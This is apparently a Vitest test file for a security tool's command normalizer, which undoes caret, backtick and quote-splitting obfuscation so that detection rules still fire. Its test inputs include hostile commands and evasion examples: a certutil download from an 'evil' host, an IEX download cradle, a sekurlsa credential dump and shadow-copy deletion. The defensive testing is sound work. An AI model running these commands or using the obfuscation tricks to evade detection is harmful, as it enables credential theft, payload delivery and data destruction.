import { describe, it, expect } from "vitest";
import { normalizeCommand, shellFromImage } from "../../src/analysis/commandNormalize.js";
import { tradecraftSignal } from "../../src/analysis/tradecraftRules.js";
import { reconTechniques } from "../../src/analysis/reconTechniques.js";
import { isSuspiciousCmd } from "../../src/analysis/siemImport.js";

describe("shellFromImage", () => {
  it("recognises the PowerShell family and cmd, and admits ignorance otherwise", () => {
    expect(shellFromImage("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")).toBe(
      "powershell",
    );
    expect(shellFromImage("pwsh")).toBe("powershell");
    expect(shellFromImage("C:\\Windows\\System32\\cmd.exe")).toBe("cmd");
    expect(shellFromImage("/bin/bash")).toBe("unknown");
    expect(shellFromImage("")).toBe("unknown");
  });
});

describe("normalizeCommand — cmd caret escapes", () => {
  it("strips carets so a caret-split binary name matches", () => {
    const r = normalizeCommand("c^m^d /c who^ami", "cmd");
    expect(r.text).toBe("cmd /c whoami");
    expect(r.tricks).toContain("caret");
    expect(r.changed).toBe(true);
  });

  it("collapses a doubled caret to the literal caret it represents", () => {
    expect(normalizeCommand("echo a^^b", "cmd").text).toBe("echo a^b");
  });

  it("leaves a caret that escapes nothing alone", () => {
    const r = normalizeCommand("echo done^", "cmd");
    expect(r.text).toBe("echo done^");
    expect(r.changed).toBe(false);
  });

  it("treats a caret inside double quotes as the literal cmd.exe reads", () => {
    const raw = 'echo "a^b"';
    expect(normalizeCommand(raw, "cmd").text).toBe(raw);
  });

  it("joins a caret line continuation", () => {
    const r = normalizeCommand("seku^\r\nrlsa", "cmd");
    expect(r.text).toBe("sekurlsa");
    expect(r.tricks).toContain("continuation");
  });
});

describe("normalizeCommand — PowerShell backtick escapes", () => {
  it("strips backticks so a backtick-split flag matches", () => {
    const r = normalizeCommand("p`o`w`ershell -e`n`c ABCD", "powershell");
    expect(r.text).toBe("powershell -enc ABCD");
    expect(r.tricks).toContain("backtick");
  });

  // Backtick-n is a NEWLINE inside double quotes and a literal "n" outside — which is exactly what
  // `-e`n`c` relies on. The two readings must not share a rule.
  it("expands an escape inside double quotes to the character it really produces", () => {
    expect(normalizeCommand('echo "a`nb"', "powershell").text).toBe('echo "a\nb"');
    expect(normalizeCommand('echo "a`tb"', "powershell").text).toBe('echo "a\tb"');
  });

  it("treats the same escape outside quotes as its literal letter", () => {
    expect(normalizeCommand("echo a`nb", "powershell").text).toBe("echo anb");
  });

  // `a is BEL and `0 is NUL. Mapping them to a space spliced two words into a rule match.
  it("expands a control escape to its control character, never to whitespace", () => {
    const r = normalizeCommand('echo "vssadmin`adelete"', "powershell");
    expect(r.text).toBe('echo "vssadmin\x07delete"');
    expect(r.text).not.toContain("vssadmin delete");
  });

  it("leaves a backtick inside single quotes alone", () => {
    const raw = "echo 'a`nb'";
    expect(normalizeCommand(raw, "powershell").text).toBe(raw);
  });

  it("turns an escaped space into a real space", () => {
    expect(normalizeCommand("cd C:\\Program` Files", "powershell").text).toBe("cd C:\\Program Files");
  });

  it("joins a backtick line continuation", () => {
    expect(normalizeCommand("seku`\r\nrlsa", "powershell").text).toBe("sekurlsa");
  });
});

describe("normalizeCommand — string splitting", () => {
  it("joins a quoted concatenation", () => {
    const r = normalizeCommand('"po"+"wer"+"shell" -nop', "powershell");
    expect(r.text).toBe("powershell -nop");
    expect(r.tricks).toContain("concat");
  });

  it("joins single-quoted concatenation with surrounding spaces", () => {
    expect(normalizeCommand("'IE'  +  'X' $payload", "powershell").text).toBe("IEX $payload");
  });

  it("removes an empty quote pair used to break a token", () => {
    const r = normalizeCommand('pow""ershell -enc ABCD', "cmd");
    expect(r.text).toBe("powershell -enc ABCD");
    expect(r.tricks).toContain("quote-split");
  });

  it("rejoins a token split by a non-empty quote pair", () => {
    expect(normalizeCommand('c"er"tutil -urlcache', "cmd").text).toBe("certutil -urlcache");
  });
});

describe("normalizeCommand — leaves legitimate commands alone", () => {
  it("keeps a quoted path containing spaces intact", () => {
    const raw = 'robocopy "C:\\Program Files\\App" D:\\backup /MIR';
    const r = normalizeCommand(raw, "cmd");
    expect(r.text).toBe(raw);
    expect(r.changed).toBe(false);
    expect(r.tricks).toEqual([]);
  });

  it("reports no change for an ordinary command line", () => {
    const raw = "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1";
    expect(normalizeCommand(raw, "powershell").changed).toBe(false);
  });

  it("does not treat an arithmetic plus between bare words as concatenation", () => {
    expect(normalizeCommand("calc 2 + 2", "cmd").text).toBe("calc 2 + 2");
  });

  // A doubled quote INSIDE a string is an escaped literal quote, not a token split.
  it("reads a doubled quote inside a string as one literal quote", () => {
    expect(normalizeCommand('Write-Output "se""kurlsa"', "powershell").text).toBe('Write-Output "se"kurlsa"');
  });

  it("does not resolve concatenation written inside a single-quoted literal", () => {
    const raw = 'Write-Output \'"IE"+"X"\'';
    expect(normalizeCommand(raw, "powershell").text).toBe(raw);
  });

  it("ignores a caret when the shell is PowerShell, which has no caret escape", () => {
    const raw = "Write-Output se^kurlsa";
    expect(normalizeCommand(raw, "powershell").text).toBe(raw);
  });

  // With no image there is no shell, and one stray escape character is far more likely to be text
  // than evasion. Real obfuscation sprays them.
  it("ignores a lone escape character when the shell is unknown", () => {
    expect(normalizeCommand("Write-Output se^kurlsa").changed).toBe(false);
    expect(normalizeCommand("echo a`nb").changed).toBe(false);
  });

  it("still honours a run of escape characters when the shell is unknown", () => {
    expect(normalizeCommand("c^e^r^t^u^t^i^l -urlcache").text).toBe("certutil -urlcache");
  });
});

describe("normalizeCommand — bounds", () => {
  it("returns oversized input unchanged rather than scanning it", () => {
    const raw = "c^md ".repeat(5000);
    const r = normalizeCommand(raw, "cmd");
    expect(r.text).toBe(raw);
    expect(r.changed).toBe(false);
    expect(r.truncated).toBe(true);
  });

  it("handles empty input", () => {
    expect(normalizeCommand("").text).toBe("");
  });
});

describe("wired into the command matchers", () => {
  it("grades a caret-escaped shadow-copy deletion the same as the plain form", () => {
    const plain = tradecraftSignal("cmd.exe", "vssadmin delete shadows /all /quiet");
    const escaped = tradecraftSignal("cmd.exe", "vssadmin de^lete sha^dows /all /quiet");
    expect(plain?.weight).toBe("strong");
    expect(escaped?.weight).toBe("strong");
    expect(escaped?.mitre).toEqual(plain?.mitre);
  });

  it("recognises a caret-escaped certutil download", () => {
    expect(reconTechniques("cmd.exe", "c^e^r^t^u^t^i^l -urlcache -f http://evil/x.exe")).toContain("T1105");
  });

  it("grades a backtick-escaped encoded PowerShell command", () => {
    expect(isSuspiciousCmd("powershell.exe", "-e`n`c SQBFAFgAIAAoAA==")).toBe("weak");
  });

  it("grades a caret-escaped credential dump as strongly as the plain form", () => {
    expect(isSuspiciousCmd("cmd.exe", "se^ku^rlsa::logonpasswords")).toBe("strong");
  });

  it("recognises a concatenated IEX download cradle", () => {
    expect(
      isSuspiciousCmd("powershell.exe", "'IE'+'X' (New-Object Net.WebClient).DownloadString('http://x')"),
    ).toBe("weak");
  });

  it("still grades unescaped commands exactly as before", () => {
    expect(isSuspiciousCmd("", "certutil -urlcache -f http://evil/x.exe")).toBe("weak");
    expect(tradecraftSignal("", "vssadmin delete shadows")?.mitre).toContain("T1490");
    expect(reconTechniques("", "certutil -urlcache -f http://x")).toContain("T1105");
  });

  it("leaves an ordinary admin command ungraded", () => {
    expect(isSuspiciousCmd("cmd.exe", 'robocopy "C:\\Program Files\\App" D:\\backup /MIR')).toBeNull();
  });
});

// Every one of these graded as an attack under the first version of this module. They are the
// reason it does quote-aware scanning instead of chained replace() calls.
describe("regressions — strings that must never grade as an attack", () => {
  it("does not splice a match across the original and its normalized reading", () => {
    // `vssadmin\s+delete` matched `vssadmin` at the end of the original and `delete` at the start
    // of the normalized copy, because \s matches the newline they were joined with.
    expect(isSuspiciousCmd("cmd.exe", "de^lete harmless vssadmin")).toBeNull();
    expect(tradecraftSignal("cmd.exe", "ha^cker harmless process")).toBeNull();
  });

  it("does not read a doubled literal quote as a token split", () => {
    expect(isSuspiciousCmd("powershell.exe", 'Write-Output "se""kurlsa"')).toBeNull();
  });

  it("does not turn a BEL escape into the whitespace of a rule", () => {
    expect(tradecraftSignal("powershell.exe", 'Write-Output "vssadmin`adelete"')).toBeNull();
  });

  it("does not resolve concatenation inside a single-quoted literal", () => {
    expect(isSuspiciousCmd("powershell.exe", 'Write-Output \'"IE"+"X"\'')).toBeNull();
  });

  it("does not apply cmd caret rules to a PowerShell command line", () => {
    expect(isSuspiciousCmd("powershell.exe", "Write-Output se^kurlsa")).toBeNull();
  });
});
